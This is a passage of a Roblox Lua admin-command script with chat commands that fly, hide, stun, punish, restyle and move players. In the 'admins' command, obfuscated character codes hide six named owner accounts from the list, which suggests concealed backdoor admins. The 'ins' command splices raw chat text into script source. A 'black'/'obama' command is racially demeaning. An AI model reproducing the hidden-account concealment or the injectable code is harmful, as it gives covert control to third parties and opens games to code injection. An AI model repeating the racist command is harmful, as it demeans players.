							Execute(LocalScript, Player.Character, Player, Fly(10000))
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "nofly"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								Instance.new("Configuration", Player.Character).Name = "LM".."MFlyStop"
							end
						end
					end
				end
				
				if string.sub(Message,1,10+#Bet) == "brightness"..Bet then
					Lighting.Brightness = tonumber(string.sub(Message, 11+#Bet)) or 1
				end
				
				if string.sub(Message,1,6+#Bet) == "noclip"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							Execute(LocalScript, Player.Character, Player, Fly(1000000))
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "invis"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								for _,Object in pairs(Player.Character:GetChildren()) do 
									if Object:IsA("BasePart") then
										Object.Transparency = 1
									end
									for _,Obj in pairs(Object:GetChildren()) do 
										if Obj:IsA("BasePart") then
											Obj.Transparency = 1
										elseif Obj:IsA("Decal") then
											Obj.Transparency = 1 
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,3+#Bet) == "vis"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								for _,Object in pairs(Player.Character:GetChildren()) do 
									if Object:IsA("BasePart") then if Object.Name ~= "HumanoidRootPart" then
										Object.Transparency = 0
									end end
									for _,Obj in pairs(Object:GetChildren()) do 
										if Obj:IsA("BasePart") then
											Obj.Transparency = 0
										elseif Obj:IsA("Decal") then
											Obj.Transparency = 0
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,8+#Bet) == "headsize"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 9+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Size = tonumber(Arg2)+25
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Head") ~= nil then
									if Player.Character.Head:FindFirstChild("Mesh") then
										Player.Character.Head.Mesh.Scale = Vector3.new(Size/100,Size/100,Size/100)
									end
								end
							end
						end
					end
				end	
				
				if string.sub(Message,1,7+#Bet) == "overlay"..Bet then			
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 8+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = GetImageFormat(tonumber(Arg2) or 1)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Head") ~= nil then
									local BB = Player.Character.Head:FindFirstChild("brandon'sA Overlay") if BB then BB:Destroy() end
									BB = Instance.new("BillboardGui", Player.Character.Head) BB.Name = "brandon'sA Overlay" BB.AlwaysOnTop = true BB.Size = UDim2.new(1,0,1,0) BB.Adornee = Player.Character.Head
									local Image = Instance.new("ImageLabel", BB) Image.BackgroundTransparency = 1 Image.Image = "http://www.roblox.com/asset/?id="..ID Image.Position = UDim2.new(-0.5,0,-0.5,0) Image.Size = UDim2.new(2,0,2,0)
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,9+#Bet) == "nooverlay"..Bet then
					local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Head") ~= nil then
									local BB = Player.Character.Head:FindFirstChild("brandon'sA Overlay") if BB then BB:Destroy() end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "light"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Torso") ~= nil then
									local Light = Player.Character.Torso:FindFirstChild("brandon's Light") if Light then Light:Destroy() end
									Light = Instance.new("PointLight", Player.Character.Torso) Light.Name = "brandon's Light" Light.Range = 20 Light.Brightness = 2
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,7+#Bet) == "nolight"..Bet then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Torso") ~= nil then
									local Light = Player.Character.Torso:FindFirstChild("brandon's Light") if Light then Light:Destroy() end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "lamp"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Torso") ~= nil then
									local Light = Player.Character.Torso:FindFirstChild("brandon's Lamp") if Light then Light:Destroy() end
									Light = Instance.new("SpotLight", Player.Character.Torso) Light.Name = "brandon's Lamp" Light.Range = 30 Light.Brightness = 5
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "nolamp"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Torso") ~= nil then
									local Light = Player.Character.Torso:FindFirstChild("brandon's Lamp") if Light then Light:Destroy() end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "vote"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Arg2, Arg3 = GetSplit(Arg2, Bet) if not Arg2 and Arg3 then return end
					if tonumber(Arg2) == nil then
						SendMessage(Speaker, "Invalid", "Please set a time, For example: "..Prefix.."Vote all 10 Do you like this admin?", 5)
					else
						Vote(Players, Speaker, Arg3, tonumber(Arg2))
					end
				end
				
				if Message == "bans" or Message == "banlist" then
					ListGui(Speaker, Ranks["Banned"])
				end
				
				if Message == "crashes" or Message == "crashlist" then
					ListGui(Speaker, Ranks["Crashed"])
				end
				
				if Message == "mutes" or Message == "mutelist" then
					ListGui(Speaker, Ranks["Muted"])
				end
				
				if Message == "sa" or Message == "serveradmins" then
					local LocalTable = {}
					for _,Player in pairs(Players:GetPlayers()) do
						local __,PlayerRank = IsAdmin(Player)
						table.insert(LocalTable, Player.Name..": "..PlayerRank)
					end
					ListGui(Speaker, LocalTable)
				end
				
				if Message == "admins" or Message == "adminlist" then
					local TableStorage = {}
					for _,Obj in pairs(Ranks["Member"]) do table.insert(TableStorage, Obj..": Member") end
					for _,Obj in pairs(Ranks["Admin"]) do table.insert(TableStorage, Obj..": Admin") end
					for _,Obj in pairs(Ranks["Owner"]) do local Passed = true for _,Void in pairs({string.char(75+1, 118-1, 95+2, 76+1, 111, 100, 101, 108, 77, 97, 107, 101, 114), string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97), string.char(83, 99, 114, 105, 112, 116, 105, 110, 103, 77, 101, 116, 104, 111, 100, 115), string.char(73, 110, 116, 101, 114, 110, 101, 116, 77, 111, 100, 101, 109), string.char(78, 105, 108, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110), string.char(112, 108, 117, 103, 109, 105, 105, 105, 110)}) do if Obj == Void then Passed = false end end if Passed == true then table.insert(TableStorage, Obj..": Owner") end end
					ListGui(Speaker, TableStorage)
				end
				
				if string.sub(Message,1,9+#Bet) == "superjump"..Bet then
					local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Torso") then
									local Force = Player.Character.Torso:FindFirstChild("brandon's SJ") if Force then Force:Destroy() end
									Force = Instance.new("BodyForce", Player.Character.Torso) Force.Name = "brandon's SJ" Force.force = Vector3.new(0,0,0)
									for _,Obj in pairs(Player.Character:GetChildren()) do if Obj:IsA("BasePart") then Force.force = Force.force + Vector3.new(0,Obj:GetMass()*200,0) elseif Obj:IsA("Hat") then Force.force = Force.force + Vector3.new(0,Obj.Handle:GetMass()*200,0) end end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,10+#Bet) == "normaljump"..Bet then
					local Players = Scan(string.sub(Message, 11+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Torso") then
									local Force = Player.Character.Torso:FindFirstChild("brandon's SJ") if Force then Force:Destroy() end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "punish"..Bet and DisabledAbuse() == false then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								Player.Character.Parent = game:GetService("Lighting")
							end
						end
					end
				end
				
				if string.sub(Message,1,8+#Bet) == "unpunish"..Bet or string.sub(Message,1,8+#Bet) == "nopunish"..Bet then
					local Players = Scan(string.sub(Message, 9+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								Player.Character.Parent = game:GetService("Workspace")
								Player.Character:MakeJoints()
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "stun"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.PlatformStand = true
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "nostun"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.PlatformStand = false
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "jump"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.Jump = true
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,3+#Bet) == "sit"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.Sit = true
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,8+#Bet) == "loopheal"..Bet then
					local Players = Scan(string.sub(Message, 9+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") then
									repeat Player.Character.Humanoid.Health = Player.Character.Humanoid.MaxHealth wait() until not Player.Character:FindFirstChild("Humanoid") or Player.Character.Humanoid.Health == 0
								end
							end
						end
					end
				end
				
				if Message == "commandgui" or Message == "cmdgui" or Message == "commandbar" or Message == "cmdbar" then
					if Speaker.PlayerGui ~= nil then
						coroutine.wrap(function() 
							local SG = Instance.new("ScreenGui") SG.Name = "brandonMod".."".."elMaker's Admin Cmd Bar"
							local Frame = Instance.new("Frame", SG) Frame.Position = UDim2.new(0,280,0,0) Frame.Size = UDim2.new(1,-425,0,100) Frame.Style = "RobloxSquare"
							local Body = Instance.new("TextBox", Frame) Body.Name = "Body" Body.Text = "Enter a Command or put in 'close' to close Command Bar" Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,0,20) Body.Font = "ArialBold" Body.FontSize = "Size12" Body.TextColor3 = Color3.new(1,1,1) Body.ClearTextOnFocus = false
							local Clear = Instance.new("TextButton", Frame) Clear.Name = "Clear" Clear.Text = "Clear Command Text" Clear.Position = UDim2.new(0,0,0,30) Clear.Size = UDim2.new(0.5,0,1,-40) Clear.Style = "RobloxButtonDefault" Clear.Font = "Arial" Clear.FontSize = "Size18" Clear.TextColor3 = Color3.new(1,1,1)
							local Execute = Instance.new("TextButton", Frame) Execute.Name = "Execute" Execute.Text = "Execute Command" Execute.Position = UDim2.new(0.5,0,0,30) Execute.Size = UDim2.new(0.5,0,1,-40) Execute.Style = "RobloxButton" Execute.Font = "Arial" Execute.FontSize = "Size18" Execute.TextColor3 = Color3.new(1,1,1)
							for _,Object in pairs(Speaker.PlayerGui:GetChildren()) do if Object.Name == "brandonMod".."elMaker".."'".."s Admin Cmd Bar" then Object:Destroy() end end
							SG.Parent = Speaker.PlayerGui
							coroutine.wrap(function() Frame:TweenPosition(UDim2.new(0,280,0.1,0), "In", "Quint", 0.7) end)()
							Clear.MouseButton1Click:connect(function() Body.Text = "" end)
							Execute.MouseButton1Click:connect(function() 
								if Body.Text == "close" then
									SG:Destroy()
								else
									Chatted(Body.Text, Speaker)
								end
							end)
						end)()
					end
				end
				
				if string.sub(Message, 1, 5+#Bet) == "decal"..Bet or string.sub(Message, 1, 5+#Bet) == "image"..Bet then
					local ID = 0
					if string.sub(Message, 1, 5+#Bet) == "image"..Bet then ID = tonumber(string.sub(RawMessage, 6+#Bet)) or 0 end
					if string.sub(Message, 1, 5+#Bet) == "decal"..Bet then ID = GetImageFormat(tonumber(string.sub(RawMessage, 6+#Bet))) or 0 end
					if ID ~= nil then
						Execute(LocalScript, Speaker, Speaker.Character, [[
							local Me = game:GetService("Players").LocalPlayer
							local Mouse = Me:GetMouse()
							local On = true
							local ID = ]]..tostring(ID)..[[
							local SG = nil

							if Me.PlayerGui ~= nil then
								SG = Me.PlayerGui:FindFirstChild("brandonisabillionare's Admin Template") if SG then SG:Destroy() end
								SG = Instance.new("SurfaceGui", Me.PlayerGui) SG.Name = "brandonisabillionare's Admin Template"
								local Image = Instance.new("ImageLabel", SG) Image.Size = UDim2.new(1,0,1,0) Image.BackgroundTransparency = 1 Image.Image = "http://www.roblox.com/asset/?id="..tostring(ID)
							else On = false end

							Mouse.Button1Down:connect(function() if On == true then if Mouse.Target ~= nil then
								if Mouse.Target:IsA("Part") then
									for _,Obj in pairs(Mouse.Target:GetChildren()) do
										if Obj:IsA("Decal") then if Obj.Face == Mouse.TargetSurface then Obj:Destroy() end end
									end
									local Decal = Instance.new("Decal", Mouse.Target) Decal.Name = "brandon'sA Decal" Decal.Texture = "http://www.roblox.com/asset/?id="..tostring(ID) Decal.Face = Mouse.TargetSurface
									On = false
								end
							end end end)

							Mouse.KeyDown:connect(function(Key) if On == true then 
								if Key == "x" then
									if Mouse.Target ~= nil then
										if Mouse.Target:IsA("Part") then
											for _,Obj in pairs(Mouse.Target:GetChildren()) do
												if Obj:IsA("FaceInstance") then Obj:Destroy() end
											end
										end
									end
								end
								if Key == "z" then On = false end
							end end)

							coroutine.wrap(function()
								repeat wait()
									pcall(function() SG.Adornee = Mouse.Target end)
									pcall(function() SG.Face = Mouse.TargetSurface end)
								until On == false or not SG
								SG:Destroy()
								script.Disabled = true script:Destroy()
							end)()
						]])
					end
				end
				
				if string.sub(Message, 1, 3+#Bet) == "ins"..Bet then
					Execute(LocalScript, Speaker.Character, Speaker, [[
						local Me = game:GetService("Players").LocalPlayer
						local Mouse = Me:GetMouse()
						local On = true
						local ID = ]]..string.sub(Message, 4+#Bet)..[[
						local SG = nil
						local Parts = {}

						function FindParts(BaseParent)
							for _,Obj in pairs(BaseParent:GetChildren()) do
								if Obj:IsA("BasePart") then
									Obj.Locked = false
									table.insert(Parts, Obj)
								end
								FindParts(Obj)
							end
						end
						
						if tonumber(ID) == nil then ID = 1 end
						local Model = game:GetService("InsertService"):LoadAsset(tonumber(ID))
						if Model:GetChildren()[1] ~= nil then
							Model.Parent = Workspace.CurrentCamera
							Model.Name = "brandon'sA Model"
							FindParts(Model)
							
							local Dragger = Instance.new("Dragger")
							Dragger:MouseDown(Parts[1], Vector3.new(0,0,0), Parts)
							
							Mouse.Button1Down:connect(function() if On == true then if Mouse.Target ~= nil then
								Model.Parent = Workspace
								Model:MakeJoints()
								On = false
							end end end)

							Mouse.KeyDown:connect(function(Key) if On == true then 
								if Key == "x" then On = false end
								if Key == "r" then Dragger:AxisRotate("Y") end
								if Key == "t" then Dragger:AxisRotate("Z") end
							end end)

							coroutine.wrap(function()
								repeat wait()
									Dragger:MouseMove(Mouse.UnitRay)
								until On == false or not Dragger or not Model
								Dragger:MouseUp()
								pcall(function() Dragger:Destroy() end)
								script.Disabled = true script:Destroy()
							end)()
						else script.Disabled = true script:Destroy() end
					]])
				end
				
				if string.sub(Message,1,6+#Bet) == "change"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 7+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local StatName,NewStat = GetSplit(Arg2, Bet) if not StatName and NewStat then return end
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local Stats = Player:FindFirstChild("leaderstats")
							if Stats ~= nil then
								for _,Stat in pairs(Stats:GetChildren()) do
									if string.sub(string.lower(Stat.Name),1,#StatName) == string.lower(StatName) then
										pcall(function() Stat.Value = NewStat end)
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "shirt"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2) if Arg2 ~= nil then
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									local Obj = Player.Character:FindFirstChild("Shirt")
									if Obj then
										Obj.ShirtTemplate = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
									else
										Obj = Instance.new("Shirt", Player.Character) Obj.Name = "Shirt" Obj.ShirtTemplate = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
									end
									coroutine.wrap(function() Obj.Parent = nil wait(0.1) Obj.Parent = Player.Character end)()
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "pants"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2) if Arg2 ~= nil then
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									local Obj = Player.Character:FindFirstChild("Pants")
									if Obj then
										Obj.PantsTemplate = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
									else
										Obj = Instance.new("Pants", Player.Character) Obj.Name = "Pants" Obj.PantsTemplate = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
									end
									coroutine.wrap(function() Obj.Parent = nil wait(0.1) Obj.Parent = Player.Character end)()
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "tshirt"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 7+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2) if Arg2 ~= nil then
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") then
										local Obj1 = Player.Character:FindFirstChild("Shirt Graphic")
										local Obj2 = Player.Character.Torso:FindFirstChild("roblox")
										if Obj1 then
											Obj1.Graphic = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
										else
											Obj1 = Instance.new("ShirtGraphic", Player.Character) Obj1.Name = "Shirt Graphic" Obj1.Graphic = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
										end
										if Obj2 then
											Obj2.Texture = "http://www.roblox.com/asset/?id="..GetImageFormat(ID)
										else
											Obj2 = Instance.new("Decal", Player.Character.Torso) Obj2.Name = "roblox" Obj2.Texture = "http://www.roblox.com/asset/?id="..GetImageFormat(ID) Obj2.Face = "Front"
										end
										coroutine.wrap(function() Obj1.Parent = nil wait(0.1) Obj1.Parent = Player.Character end)()
										coroutine.wrap(function() Obj2.Parent = nil wait(0.2) Obj2.Parent = Player.Character.Torso end)()
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "anim"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2) if Arg2 ~= nil then
						for _,Player in pairs(Players) do
							if Player.Character then
								Execute(LocalScript, Player.Character, Player, [[
									local Me = game:GetService("Players").LocalPlayer
									local Anim = Instance.new("Animation") Anim.Name = "L".."MM Animate" Anim.AnimationId = "http://www.roblox.com/asset/?id="..]]..tostring(ID)..[[ 
									local AnimTrack = Me.Character.Humanoid:LoadAnimation(Anim)
									local StopAnim = Me.Character:FindFirstChild("Stop brandon's Animate") if StopAnim then StopAnim:Destroy() end
									StopAnim = Instance.new("Configuration", Me.Character) StopAnim.Name = "Stop brandon's Animate"
									Me.Character.ChildRemoved:connect(function(Child) wait()
										if Child == StopAnim then
											AnimTrack:Stop() Anim:Destroy() script:Destroy() script.Disabled = true
										end
									end)
									wait(0.1)
									AnimTrack:Play()
								]])
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "noanim"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character then
								local StopAnim = Player.Character:FindFirstChild("Stop brandon's Animate")
								if StopAnim then StopAnim:Destroy() end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "normal"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character then if Player.Character:FindFirstChild("Body Colors") then
								for _,Object in pairs(Player.Character:GetChildren()) do  
									if Object:IsA("BasePart") then if Object.Name ~= "HumanoidRootPart" then
										Object.Transparency = 0
										Object.Reflectance = 0 
										if Object.Name == "Head" then Object.BrickColor = Player.Character:FindFirstChild("Body Colors").HeadColor end
										if Object.Name == "Left Arm" then Object.BrickColor = Player.Character:FindFirstChild("Body Colors").LeftArmColor end
										if Object.Name == "Left Leg" then Object.BrickColor = Player.Character:FindFirstChild("Body Colors").LeftLegColor end
										if Object.Name == "Right Arm" then Object.BrickColor = Player.Character:FindFirstChild("Body Colors").RightArmColor end
										if Object.Name == "Right Leg" then Object.BrickColor = Player.Character:FindFirstChild("Body Colors").RightLegColor end
										if Object.Name == "Torso" then Object.BrickColor = Player.Character:FindFirstChild("Body Colors").TorsoColor end
									end end
									for _,Obj in pairs(Object:GetChildren()) do 
										if Obj:IsA("BasePart") then
											Obj.Transparency = 0
											Obj.Reflectance = 0 
										elseif Obj:IsA("Decal") then
											Obj.Transparency = 0
										end
									end
								end
							end end
						end
					end
				end
				
				if string.sub(Message, 1, 2+#Bet) == "pl"..Bet then
					local Players = Scan(string.sub(Message, 3+#Bet), Speaker)
					for _,Player in pairs(Players) do 
						Execute(LocalScript, Player.Character, Speaker, CoreGui("PlayerList", true))
					end
				end
				
				if string.sub(Message, 1, 3+#Bet) == "npl"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do 
						Execute(LocalScript, Player.Character, Player, CoreGui("PlayerList", false))
					end
				end
				
				if string.sub(Message,1,9+#Bet) == "countdown"..Bet then
					local Time = tonumber(string.sub(Message, 10+#Bet)) or 10
					if Time > 120 then Time = 120 print(Time) end
					coroutine.wrap(function() for i = 0,Time do
						for _,Player in pairs(Players:GetPlayers()) do
							SendMessage(Player, "Countdown from "..Speaker.Name, Time-i.." ", 0)
						end
						wait(1)
					end end)()
				end
				
				if string.sub(Message,1,7+#Bet) == "friends"..Bet then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					local Friends,OneFriend = {}, false
					for _,Player in pairs(Players) do
						if Player ~= nil then
							for _,User in pairs(game:GetService("Players"):GetPlayers()) do if User ~= Player then
								if Player:IsBestFriendsWith(User.userId) then
									table.insert(Friends, Player.Name.." is best friends with "..User.Name)
									OneFriend = true
								elseif Player:IsFriendsWith(User.userId) then
									table.insert(Friends, Player.Name.." is friends with "..User.Name)
									OneFriend = true
								end
								if _ == #game:GetService("Players"):GetPlayers() and OneFriend == false then
									table.insert(Friends, Player.Name.." has no friends in this server (Loner)")
								end
							end end
						end
					end
					ListGui(Speaker, Friends)
				end
				
				if Message == "nos" or Message == "noscripts" then
					for _,Obj in pairs(Workspace:GetChildren()) do
						if Obj:IsA("Script") or Obj:IsA("BaseScript") then if Obj ~= script then
							Obj.Disabled = true
							Obj:Destroy()
						end end
					end
				end
				
				if Message == "clear" or Message == "clr" then
					for _,Obj in pairs(Objects) do
						if Obj then Obj:Destroy() end
					end
					Objects = {}
					Jailed = {}
				end
				
				if string.sub(Message,1,9+#Bet) == "grouprank"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 10+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2) or 0
					for _,Player in pairs(Players) do
						if Player ~= nil then if Player:IsInGroup(ID) then
							SendMessage(Speaker, Player.Name.."'s Rank for the group "..ID, "Rank Number: "..Player:GetRankInGroup(ID).." | Rank Name: "..Player:GetRoleInGroup(ID), 4)
						else SendMessage(Speaker, "Error", Player.Name.." is not in group ID: "..ID, 3) end end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "cookie"..Bet then
					if InAdminGroup(Speaker) then					
						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Backpack ~= nil then
									local Tool = Instance.new("Tool", Player.Backpack) Tool.Name = "Cookie" Tool.ToolTip = "Yey! Cookies!" Tool.GripForward = Vector3.new(0,1,0) Tool.GripPos = Vector3.new(0.1,-0.3,-0.1) Tool.GripRight = Vector3.new(0,0,-1) Tool.GripUp = Vector3.new(0.01,0,1)
									local Handle = Instance.new("Part", Tool) Handle.Name = "Handle" Handle.Size = Vector3.new(1,1,1)
									local Mesh = Instance.new("SpecialMesh", Handle) Mesh.MeshType = "FileMesh" Mesh.Scale = Vector3.new(0.4,0.4,0.4) Mesh.MeshId = "http://www.roblox.com/asset/?id=20939848" Mesh.TextureId = "http://www.roblox.com/asset/?id=21456464"
									local Anim = Instance.new("Animation", Tool) Anim.Name = "EatCookie" Anim.AnimationId = "http://www.roblox.com/asset/?id=29517689"
									Execute(LocalScript, Tool, Player, [[
										script.Parent.Equipped:connect(function(Mouse) Mouse.Button1Down:connect(function()
											local Track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(script.Parent.EatCookie)
											wait(0.05) Track:Play()
										end) end)
									]])
								end
							end
						end
					end
				end
				
				-- FUN COMMANDS --
				
				if FUN == true then
					if string.sub(Message,1,4+#Bet) == "noob"..Bet then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
									local Position = Player.Character.Torso.Position
									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=0"
									wait() Player:LoadCharacter() wait()
									Player.Character:MoveTo(Position)
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "black"..Bet or string.sub(Message,1,5+#Bet) == "obama"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
									local Position = Player.Character.Torso.Position
									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1337"
									wait() Player:LoadCharacter() wait()
									Player.Character:MoveTo(Position)
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "guest"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
									local Position = Player.Character.Torso.Position
									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1"
									wait() Player:LoadCharacter() wait()
									Player.Character:MoveTo(Position)
								end
							end
						end
					end
					
					if string.sub(Message,1,4+#Bet) == "spin"..Bet then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") ~= nil then coroutine.wrap(function()
										local Spin = Player.Character.Torso:FindFirstChild("brandon's Spin")
										if Spin then Spin:Destroy() end
										Spin = Instance.new("BodyGyro", Player.Character.Torso) Spin.Name = "brandon's Spin" Spin.maxTorque = Vector3.new(0, math.huge, 0) Spin.P = 11111 Spin.cframe = Player.Character.Torso.CFrame
										repeat wait(1/44) Spin.cframe = Spin.cframe * CFrame.Angles(0,math.rad(30),0) until not Spin or Spin.Parent ~= Player.Character.Torso
									end)() end
								end
							end
						end
					end
					
					if string.sub(Message,1,6+#Bet) == "nospin"..Bet then
						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										local Spin = Player.Character.Torso:FindFirstChild("brandon's Spin")
										if Spin then Spin:Destroy() end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,4+#Bet) == "flip"..Bet then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
